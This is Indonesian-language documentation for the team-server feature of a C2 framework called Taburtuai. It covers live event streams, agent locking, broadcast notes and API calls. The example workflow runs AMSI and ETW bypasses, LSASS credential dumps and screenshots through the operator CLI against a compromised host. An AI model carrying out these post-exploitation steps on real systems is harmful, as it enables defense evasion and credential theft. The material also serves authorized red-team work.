# 20 — Multi-Operator Team Server

> Lebih dari satu operator bisa terhubung ke C2 server secara bersamaan,
> melihat aktivitas real-time, dan mengkoordinasikan aksi tanpa saling
> mengganggu.

---

## Arsitektur

```
Operator 1 ──SSE stream──┐
Operator 2 ──SSE stream──┤──► TeamHub (in-memory) ──► Broadcast events
Operator 3 ──SSE stream──┘
                │
                ├── Agent claims (exclusive write lock per agent)
                └── Event types: checkin, result_ready, note, claim/release
```

- **SSE (Server-Sent Events)** — push unidirectional dari server ke operator.
  Tidak butuh WebSocket atau dependency tambahan.
- **Operator session** — setiap operator mendapat `session_id` saat join.
  Session digunakan untuk claim/release agent.
- **Agent claiming** — satu operator bisa "lock" agent agar tidak ada operator lain
  yang bisa queue command untuk agent tersebut.

---

## Quick Start

### Terminal 1 — Operator Alice

```bash
# Mulai live stream — semua event masuk real-time
./bin/operator team subscribe alice --server http://c2:8080

# Output:
# [+] Connected to team server as alice (session: 3a7f1b2c-...)
# [*] Press Ctrl+C to disconnect
#
# [+] 14:23:01 [2703886d] <alice> CORP-LAPTOP-JD01 checked in from 192.168.1.50
# [=] 14:23:45 [2703886d] cmd=execute status=completed duration=1.2s
```

### Terminal 2 — Operator Bob (second operator)

```bash
./bin/operator team subscribe bob --server http://c2:8080

# Bob sees the same events — including alice's activity
# [+] 14:23:01 [2703886d] CORP-LAPTOP-JD01 checked in from 192.168.1.50
# [*] 14:23:10 <alice> alice joined the team server
```

---

## Commands

### `team subscribe <name>`

Membuka live event stream. Semua event dari server di-push ke terminal secara real-time.

```bash
./bin/operator team subscribe alice
./bin/operator team subscribe alice --server https://c2.yourdomain.com
```

Events yang ditampilkan:

| Event | Ikon | Keterangan |
|-------|------|-----------|
| `agent_checkin` | `[+]` | Agent baru atau update heartbeat |
| `agent_offline` | `[-]` | Agent tidak check-in dalam timeout window |
| `result_ready` | `[=]` | Command selesai dieksekusi |
| `command_queued` | `[>]` | Command baru dikirim ke agent |
| `operator_joined` | `[*]` | Operator lain join |
| `operator_left` | `[*]` | Operator disconnect |
| `agent_claimed` | `[L]` | Agent di-lock oleh operator |
| `agent_released` | `[U]` | Agent di-release |
| `note` | `[!]` | Pesan dari operator lain |

### `team operators`

List semua operator yang sedang terhubung.

```bash
./bin/operator team operators

# Output:
# SESSION ID                            NAME              JOINED
# ─────────────────────────────────────────────────────────────────
# 3a7f1b2c-8d4e-4f1a-9b3c-1234567890ab  alice             14:20:05
# 9f2e8a1d-3c7b-4e2f-8d5a-abcdef012345  bob               14:23:10
#
# 2 operator(s) connected
```

### `team claim <agent-id>` / `team release <agent-id>`

Klaim exclusive write access ke agent. Operator lain masih bisa lihat agent,
tapi tidak bisa queue command.

```bash
# Dapatkan session_id dari output 'team subscribe' atau salin dari header response
SESSION=3a7f1b2c-8d4e-4f1a-9b3c-1234567890ab

./bin/operator team claim 2703886d --session $SESSION
# [+] Agent 2703886d claimed

# Sekarang Alice punya exclusive access
./bin/operator cmd 2703886d "whoami"  # berhasil

# Bob mencoba queue command ke agent yang sama:
./bin/operator cmd 2703886d "ipconfig"
# [!] HTTP 409: agent 2703886d is already claimed by alice

# Alice selesai
./bin/operator team release 2703886d --session $SESSION
# [+] Agent 2703886d released
```

### `team broadcast`

Kirim catatan ke semua operator yang terhubung — berguna untuk koordinasi.

```bash
./bin/operator team broadcast \
  --session $SESSION \
  --message "Starting LSASS dump on DC01, do not disturb agent 2703886d"

# Semua operator menerima:
# [!] 14:30:00 <alice> Starting LSASS dump on DC01, do not disturb agent 2703886d
```

---

## Contoh Workflow Tim 2 Operator

```bash
# === ALICE (initial access, C2 setup) ===
# Terminal 1:
./bin/operator team subscribe alice

# Tunggu agent masuk...
# [+] 14:23:01 [2703886d] CORP-LAPTOP-JD01 checked in

# Claim agent
./bin/operator team claim 2703886d --session $ALICE_SESSION

# Lakukan initial evasion
./bin/operator bypass amsi 2703886d --wait
./bin/operator bypass etw 2703886d --wait

# Broadcast ke bob bahwa agent siap
./bin/operator team broadcast --session $ALICE_SESSION \
  --message "2703886d ready for post-ex. Evasion done. Your turn Bob."

# === BOB (post-exploitation) ===
# Terminal 2:
./bin/operator team subscribe bob

# Terima notifikasi dari alice
# [!] 14:25:30 <alice> 2703886d ready for post-ex. Evasion done. Your turn Bob.

# Alice release dulu
./bin/operator team release 2703886d --session $ALICE_SESSION

# Bob claim
./bin/operator team claim 2703886d --session $BOB_SESSION

# Bob jalankan post-ex
./bin/operator creds lsass 2703886d --wait
./bin/operator screenshot 2703886d --wait
```

---

## API Reference (untuk integrasi custom)

```bash
# Register operator
curl -X POST http://c2:8080/api/v1/team/register \
  -H "Content-Type: application/json" \
  -d '{"name":"alice"}'
# → {"session_id":"...","name":"alice"}

# SSE stream
curl -N http://c2:8080/api/v1/team/events?name=alice
# → data: {"type":"agent_checkin","agent_id":"...","payload":"...","time":"..."}

# List operators
curl http://c2:8080/api/v1/team/operators

# Claim agent
curl -X POST http://c2:8080/api/v1/team/agent/2703886d.../claim \
  -H "X-Session-ID: <session_id>"

# Release agent
curl -X POST http://c2:8080/api/v1/team/agent/2703886d.../release \
  -H "X-Session-ID: <session_id>"

# Broadcast note
curl -X POST http://c2:8080/api/v1/team/broadcast \
  -H "X-Session-ID: <session_id>" \
  -H "Content-Type: application/json" \
  -d '{"type":"note","payload":"Starting privesc on target"}'
```

---

## OPSEC untuk Tim

```
□ Setiap operator punya ENCRYPTION_KEY yang sama
□ Gunakan --api-key untuk authenticate ke server jika diset
□ Claim agent sebelum melakukan operasi sensitif
□ Broadcast setiap tindakan besar (lsass dump, persistence) ke tim
□ Gunakan 'team broadcast' untuk dokumentasi real-time
□ Log dari console disimpan untuk laporan (readline history)
```

---

**Selanjutnya:** [16 — Red Team Scenarios](16-scenarios.md) untuk contoh
penggunaan semua fitur dalam engagement end-to-end.

---

*Taburtuai C2 — For authorized security testing only.*
